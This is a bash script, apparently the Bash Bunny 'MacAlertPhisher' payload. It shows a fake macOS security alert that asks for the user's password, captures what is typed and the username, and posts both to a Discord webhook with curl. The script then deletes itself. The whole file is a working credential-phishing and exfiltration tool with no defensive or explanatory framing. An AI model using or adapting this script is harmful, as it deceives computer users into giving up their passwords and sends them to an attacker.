#!/bin/bash

# Discord Webhook Link (NEEDED)
discord=""
# The alert's title
title="Macintosh Security Assistant"
# The alert's text
dialog="Your Mac has detected unusual activity. Enter your password to confirm that you are the owner."
# The alert's icon (for ex. "stop", "caution", "note")
icon="stop"
# A custom application, that should open the alert (for ex. "Finder")
app=""
# Base64 encode the entered string to prevent an injection/error
base64=false
# Check if an internet connection is available and wait until it is before trying to send the Discord message
internet_check=false

#### The main script

date=$(date)
user=$(whoami)

if [[ ${app} != "" ]]; then
	pwd=$(osascript -e 'tell app "'"${app}"'" to display dialog "'"${dialog}"'" default answer "" with icon '"${icon}"' with title "'"${title}"'" buttons {"Continue"} default button "Continue" with hidden answer')
elif [[ ${app} == "" ]]; then
	pwd=$(osascript -e 'display dialog "'"${dialog}"'" default answer "" with icon '"${icon}"' with title "'"${title}"'" buttons {"Continue"} default button "Continue" with hidden answer')
fi

pwd=${pwd#*"button returned:Continue, text returned:"}

if [[ ${base64} == true ]]; then
	pwd=$(echo $pwd | base64)
	enc_txt="(Base64)"
else
	enc_txt=""
fi

# Discord Embed Message
embed="{
  \"embeds\": [
    {
      \"color\": 14427938,
      \"footer\": {
        \"text\": \"Captured: ${date}\"
      },
      \"author\": {
        \"name\": \"Bash Bunny • MacAlertPhisher\",
        \"url\": \"https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/phishing/MacAlertPhisher\",
        \"icon_url\": \"https://www.gitbook.com/cdn-cgi/image/width=40,dpr=2,height=40,fit=contain,format=auto/https%3A%2F%2F3076592524-files.gitbook.io%2F~%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FnxJgJ9UdPfrcuL1U8DpL%252Ficon%252F1UaEKnAJMPWZDBVtU8Il%252Fbb.png%3Falt%3Dmedia%26token%3D43bf1669-462c-4295-b30b-94c295470371\"
      },
      \"fields\": [
        {
          \"name\": \"Current User\",
          \"value\": \"${user}\",
          \"inline\": true
        },
        {
          \"name\": \"Entered Credentials ${enc_txt}\",
          \"value\": \"${pwd}\",
          \"inline\": true
        }
      ]
    }
  ]
}"

if [[ ${internet_check} == true ]]; then
	while [[ $(ping -c1 google.com | grep -c "1 packets received") != "1" ]]; do
		sleep 5
	done
fi

curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "${embed}" ${discord}

# Self destruct
rm /tmp/script.sh